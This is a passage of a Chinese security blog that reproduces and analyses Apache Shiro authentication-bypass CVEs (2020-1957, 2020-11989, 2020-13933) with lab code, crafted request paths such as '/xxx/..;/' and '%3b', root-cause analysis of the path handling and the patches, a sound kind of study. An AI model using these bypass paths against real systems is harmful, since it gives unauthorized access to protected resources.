class="name">project.reporting.outputEncoding</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">spring-boot.version</span>&gt;</span>2.1.5.RELEASE<span class="tag">&lt;/<span class="name">spring-boot.version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">&lt;!--shiro-spring--&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>补：关于版本的原因后续在该篇文章看到解答——<a target="_blank" rel="noopener" href="http://rui0.cn/archives/1643">Spring Boot中关于%2e的Trick - Ruilin</a></p>
<blockquote>
<p>当 Spring Boot 版本在小于等于 2.3.0.RELEASE 的情况下，alwaysUseFullPath 为默认值 false，这会使得其获取 ServletPath ，所以在路由匹配时相当于会进行路径标准化包括对 %2e 解码以及处理跨目录，这可能导致身份验证绕过。而反过来由于高版本将 alwaysUseFullPath 自动配置成了 true 从而开启全路径，又可能导致一些安全问题。</p>
</blockquote>
<h4 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>对于路径<code>/CVE-2020-1957</code>，使用以下方式绕过。</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/xxx/..;/CVE-2020-1957</span><br><span class="line">/;/CVE-2020-1957</span><br></pre></td></tr></table></figure>

<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241204035757799.png"><br><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241204040027613.png"></p>
<p>对于路径<code>/cmisl/CVE-2020-1957</code>，可以使用以下方式绕过。</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cmisl;/CVE-2020-1957</span><br></pre></td></tr></table></figure>

<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241204041459890.png"></p>
<h4 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>与Shiro-682是因为shiro和spring对路径分隔符<code>/</code>处理的差异化类似。该漏洞是由于shiro和spring对于分号<code>;</code>的差异化处理造成的。就用<code>/xx/..;/CVE-2020-1957</code>来分析</p>
<p>大致一看是在<code>PathMatchingFilterChainResolver#getChain</code>方法中，通过getPathWithinApplication方法获取请求URI时，只得到分号之前的URI，也就是<code>/xx/..</code>。因此没有对应的过滤路径与其匹配。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241204043335155.png"></p>
<p>具体就可以跟进去，到<code>WebUtils#decodeAndCleanUriString</code>，会获取分号的位置，然后截取前面的内容并且返回。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241204043603312.png"></p>
<p>而spring的处理是在<code>UrlPathHelper#decodeAndCleanUriString</code>，可以看到对uri的处理主要是三个方法进行处理。分别是：</p>
<ul>
<li>removeSemicolonContent：删除分号后到分隔符之间的内容。(包含分号)</li>
<li>decodeRequestString：URL解码。</li>
<li>getSanitizedPath：规范路径。（比如&#x2F;&#x2F;aaa-&gt;&#x2F;aaa）</li>
</ul>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241224023133929.png"></p>
<p>根据上面三个方法的解释，我们可以设计一个绕过路径。比如：<code>/aaa;aaa///..;abc/test</code>。<br>首先会把分号到分隔符之间的内容(包括分号)直接内容去除，上面路径则变成<code>/aaa///../test</code>，然后解码、规范化，上面路径变成<code>/aaa/../test</code>。后续便会标准化成<code>/test</code>。</p>
<p>而我们的访问路径<code>/xx/..;/CVE-2020-1957</code>，就是<code>/CVE-2020-1957</code>。</p>
<h4 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>通过<code>request.getContextPath()</code>、<code>request.getServletPath()</code>、<code>request.getPathInfo()</code> 进行拼接，获取经过处理后的URI。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250111022347874.png"></p>
<h4 id="参考链接-3"><a href="#参考链接-3" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/1643">Spring Boot中关于%2e的Trick - Ruilin</a></p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/shiro-3/#%E7%BB%95%E8%BF%87">从 CVE 学 Shiro 安全-3 | 素十八</a></p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2023/03/16/Java-Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#0x06-CVE-2020-1957-%E4%B8%8E-Shiro682">Java Shiro 权限绕过多漏洞分析 | Drunkbaby’s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10799?time__1311=CqjxRDnD0m0QDsf5YIrwDf2QDgQk=TTW4D">tomcat容器url解析特性研究 - 先知社区</a></p>
<h3 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h3><blockquote>
<p>Apache Shiro before 1.5.3, when using Apache Shiro with Spring dynamic controllers, a specially crafted request may cause an authentication bypass.</p>
</blockquote>
<h4 id="漏洞信息-6"><a href="#漏洞信息-6" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：<code>shiro &lt; 1.5.3</code></p>
<p>漏洞成因：Shiro对URL二次解码造成的绕过以及Shiro与Spring处理路径的差异化导致的绕过。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/01887f645f92d276bbaf7dc644ad28ed4e82ef02">Merge pull request #211 from apache&#x2F;SHIRO-753 · apache&#x2F;shiro@01887f6</a></p>
<h4 id="绕过方式一：URL二次解码"><a href="#绕过方式一：URL二次解码" class="headerlink" title="绕过方式一：URL二次解码"></a>绕过方式一：URL二次解码</h4><h5 id="漏洞环境-6"><a href="#漏洞环境-6" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>添加访问接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/CVE-2020-11989/&#123;test&#125;&quot;)</span>  </span><br><span class="line"><span class="meta">@ResponseBody</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">CVE_2020_11989</span><span class="params">(<span class="meta">@PathVariable</span> String test)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;html&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;head&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;title&gt;CVE-2020-11989 Page&lt;/title&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/head&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;body&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;h1&gt;Welcome to CVE-2020-11989 Page&lt;/h1&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;p&gt;This is a page that requires administrator privileges.&lt;/p&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;p&gt;test:&lt;/p&gt;&quot;</span> + test +  </span><br><span class="line">            <span class="string">&quot;&lt;/body&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/html&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>权限路径配置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();  </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/CVE-2020-1957&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/CVE-2020-1957/*&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);  </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);  </span><br><span class="line">shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);</span><br></pre></td></tr></table></figure>

<h5 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们是将<code>/CVE-2020-1957/*</code>设置需要权限才能访问的路径，所以我们正常访问因为是会跳转到登录页面的。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250112000736935.png"></p>
<p>如果我们把变量部分，也就是cmisl中间插入<code>%25%32%66</code>，就可以绕过了。</p>
<blockquote>
<p>URL编码：<code>/ </code>-&gt; <code>%2f</code> -&gt;<code>%25%32%66</code>  拆分：(<code>%25-&gt;/</code> 、 <code>%32-&gt;2</code> 、 <code>%66-&gt;f</code>)</p>
</blockquote>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250112001020741.png"></p>
<h5 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>从PathMatchingFilterChainResolver#getChain进入WebUtils#getRequestUri，很熟悉的地方，是shiro用来获取requestURI来对比拦截器链中的URI。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250114221348699.png"></p>
<p>我们在CVE-2020-1957中知道，shiro不再使用request.getRequestURI()，而是通过request.getContextPath()、request.getServletPath()、request.getPathInfo() 进行拼接，获取请求的URI。</p>
<p>而这几个方法的差异可以参考mi1k7ea师傅的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7544?time__1311=n4+xnD0Dy7eYq+Dfx05+bWGOD9D0hMdl2DTD#toc-8">Tomcat URL解析差异性导致的安全问题 - 先知社区</a></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250114230841010.png"></p>
<p>request.getRequestURI()不会进行URL解码，而request.getServletPath()，我们请求的URI是&#x2F;CVE-2020-11989&#x2F;cm%25%32%66isl，进行解码后得到的是&#x2F;CVE-2020-11989&#x2F;cm%2fisl。</p>
<blockquote>
<p><code>%25-&gt;/</code> 、 <code>%32-&gt;2</code> 、 <code>%66-&gt;f</code><br><code>%25%32%66</code>-&gt;<code>%2f</code></p>
</blockquote>
<p>后续将得到的路径，然后会调用decodeAndCleanUriString方法对路径进行解码，并且去掉分号之后的部分。然后返回交给normalize方法规范化。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250114232349617.png"></p>
<p>因此最后得到的路径是&#x2F;CVE-2020-11989&#x2F;cm&#x2F;isl。</p>
<p>我们配置的拦截规则是<code>/CVE-2020-1957/*</code>，对于这种规则，Shiro会使用AntPathMatcher这个匹配器进行路径的匹配。</p>
<p>匹配方法大致是，将匹配规则和访问路径都分成数组。然后两个数组每个元素进行匹配，这个过程中，如果发现匹配规则取出来的是**，就跳出这个循环，在下一个循环中进行匹配。如果是<code>*</code>就在matchStrings方法中处理。</p>
<p>具体规则如下：<br>比如拦截规则是<code>/cmisl/*</code>，那就可以和<code>/cmisl/abc</code>匹配，但是不能和<code>/cmisl/a/b</code>匹配。<br>如果拦截规则是<code>/cmisl/**</code>，那就可以和<code>/cmisl/abc</code>以及<code>/cmisl/a/b</code>匹配。</p>
<p>因此我们的路径<code>/CVE-2020-11989/cm/isl</code>就无法和<code>/CVE-2020-11989/*</code>匹配上。从而绕过了shiro的权限认证。</p>
<h4 id="绕过方式二：Shiro与Spring处理路径差异化"><a href="#绕过方式二：Shiro与Spring处理路径差异化" class="headerlink" title="绕过方式二：Shiro与Spring处理路径差异化"></a>绕过方式二：Shiro与Spring处理路径差异化</h4><h5 id="漏洞环境-7"><a href="#漏洞环境-7" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>设置访问根路径(application.properties)：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.servlet.context-path</span> : <span class="string">/cmisl</span></span><br></pre></td></tr></table></figure>

<p>添加访问接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/CVE-2020-11989&quot;)</span>  </span><br><span class="line"><span class="meta">@ResponseBody</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">adminPage</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="comment">// 返回简单的 HTML 页面内容  </span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;html&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;head&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;title&gt;CVE-2020-11989 Page&lt;/title&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/head&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;body&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;h1&gt;Welcome to CVE-2020-11989 Page&lt;/h1&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;p&gt;This is a page that requires administrator privileges.&lt;/p&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/body&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/html&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>权限路径配置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();  </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/CVE-2020-11989&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>); </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);  </span><br><span class="line">shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);</span><br></pre></td></tr></table></figure>

<h5 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>直接访问<code>/cmisl/CVE-2020-11989</code>，跳转到登录页面。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115044458077.png"></p>
<p>访问<code>/;/cmisl/CVE-2020-11989</code>，可以访问到需要权限的目录。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115044526191.png"></p>
<h5 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>对于Shiro来说，&#x2F;;&#x2F;cmisl&#x2F;CVE-2020-11989得到的路径经过规范化后，会去掉分号后部分，因此，Shiro得到的路径是&#x2F;，显然不会与设置的拦截规则不匹配。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115045107785.png"></p>
<p>而spring解析的路径是&#x2F;cmisl&#x2F;CVE-2020-11989，因此可以找到该资源。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115154824127.png"></p>
<h4 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>WebUtils#getPathWithinApplication方法，将原来servletPath、ServletPath、PathInfo组成的requestUri规范化后的结果，减去内容根目录contextPath的方法替换成直接用servletPath加PathInfo后再规范化。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115051728525.png"></p>
<p>并且WebUtils#getRequestUri方法将上一次漏洞的补丁撤回，直接获取整个路径。不过改方法被标记为已弃用。所以他的修改不会影响后面的绕过，主要关注的还是getPathWithinApplication方法。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115051449803.png"></p>
<h4 id="参考链接-4"><a href="#参考链接-4" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">Apache Shiro 身份验证绕过漏洞 (CVE-2020-11989) - 腾讯安全玄武实验室</a></p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/shiro-3/#antpathmatcher-%E7%BB%95%E8%BF%87">从 CVE 学 Shiro 安全-3 | 素十八</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7544?time__1311=n4+xnD0Dy7eYq+Dfx05+bWGOD9D0hMdl2DTD#toc-8">Tomcat URL解析差异性导致的安全问题 - 先知社区</a></p>
<h3 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h3><blockquote>
<p>Apache Shiro before 1.6.0, when using Apache Shiro, a specially crafted HTTP request may cause an authentication bypass.</p>
</blockquote>
<h4 id="漏洞信息-7"><a href="#漏洞信息-7" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：&#96;shiro &lt; 1.6.0</p>
<p>漏洞成因： 在1.6.0之前的Apache Shiro中，使用Apache Shiro时，特制的HTTP请求可能导致身份验证绕过。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d">Add a feature to allow for global filters · apache&#x2F;shiro@dc194fc</a></p>
<h4 id="漏洞环境-8"><a href="#漏洞环境-8" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--shiro-spring--&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>添加访问接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/CVE-2020-13933/&#123;test&#125;&quot;)</span>  </span><br><span class="line"><span class="meta">@ResponseBody</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">CVE_2020_13933</span><span class="params">(<span class="meta">@PathVariable</span> String test)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;html&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;head&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;title&gt;CVE-2020-13933 Page&lt;/title&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/head&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;body&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;h1&gt;Welcome to CVE-2020-13933 Page&lt;/h1&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;p&gt;This is a page that requires administrator privileges.&lt;/p&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;p&gt;test:&lt;/p&gt;&quot;</span> + test +  </span><br><span class="line">            <span class="string">&quot;&lt;/body&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/html&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>权限路径配置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();  </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/CVE-2020-13933/*&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>); </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);  </span><br><span class="line">shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);</span><br></pre></td></tr></table></figure>

<h4 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>正常访问&#x2F;CVE-2020-13933&#x2F;cmisl，会302跳转到登录页面。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115175203175.png"></p>
<p>访问&#x2F;CVE-2020-13933&#x2F;%3bcmisl，可以绕过权限认证，直接访问到需要权限的页面。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115175414023.png"></p>
<h4 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>我们从上一个漏洞修复中知道，WebUtils#getPathWithinApplication方法采用了getServletPath加getPathInfo方法拼接路径，然后用removeSemicolon方法移除分号，最后normalize方法进行规范化得到Shiro将要匹配的请求URI。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115181807352.png"></p>
<p>而从上个漏洞的分析中，我们可以知道getServletPath方法获取ServletPath时会进行URL解码，因此我们访问的URI路径&#x2F;CVE-2020-13933&#x2F;%3bcmisl经过获取拼接后得到的是&#x2F;CVE-2020-13933&#x2F;;cmisl，然后交给removeSemicolon方法处理。</p>
<p>将分号及其后面的内容都去除，返回&#x2F;CVE-2020-13933&#x2F;。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115182555132.png"></p>
<p>返回后在匹配前会判断URI是否是分隔符&#x2F;结尾，如果是的话就会去掉分隔符。然后得到的是&#x2F;CVE-2020-13933。我们的拦截规则是&#x2F;CVE-2020-13933&#x2F;*，无法匹配。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115182914360.png"></p>
<h4 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>设置了一个全局过滤器InvalidRequestFilter，主要检测分号和反斜杠以及非ASCII码字符。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250115214427647.png"></p>
<h4 id="参考链接-5"><a href="#参考链接-5" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8223?time__1311=n4+xnD0Dc7eYwqCwx05+b+GOD9DR2r2uLobxTD#toc-0">shiro CVE-2020-11989&amp;CVE-2020-13933复现分析 - 先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/shiro-3/#cve-2020-13933">从 CVE 学 Shiro 安全-3 | 素十八</a></p>
<h3 id="CVE-2020-17510"><a href="#CVE-2020-17510" class="headerlink" title="CVE-2020-17510"></a>CVE-2020-17510</h3><blockquote>
<p>Apache Shiro before 1.7.0, when using Apache Shiro with Spring, a specially crafted HTTP request may cause an authentication bypass.</p>
<p>If you are NOT using Shiro’s Spring Boot Starter (<code>shiro-spring-boot-web-starter</code>), you must configure add the <a target="_blank" rel="noopener" href="https://shiro.apache.org/spring-framework.html#web_applications"><code>ShiroRequestMappingConfig</code> autoconfiguration to your application</a> or configure the <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/blob/shiro-root-1.7.0/support/spring/src/main/java/org/apache/shiro/spring/web/config/ShiroRequestMappingConfig.java#L28-L30">equivalent manually</a>.</p>
</blockquote>
<h4 id="漏洞信息-8"><a href="#漏洞信息-8" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：<code>shiro &lt; 1.7.0</code></p>
<p>漏洞成因：Shiro与Spring处理含有%2e路径的差异化导致的绕过。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/6acaaee9bb3a27927b599c37fabaeb7dd6109403">Add ShiroUrlHelper and related Spring configuration · apache&#x2F;shiro@6acaaee</a></p>
<h4 id="漏洞环境-9"><a href="#漏洞环境-9" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--shiro-spring--&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>添加接口</p>
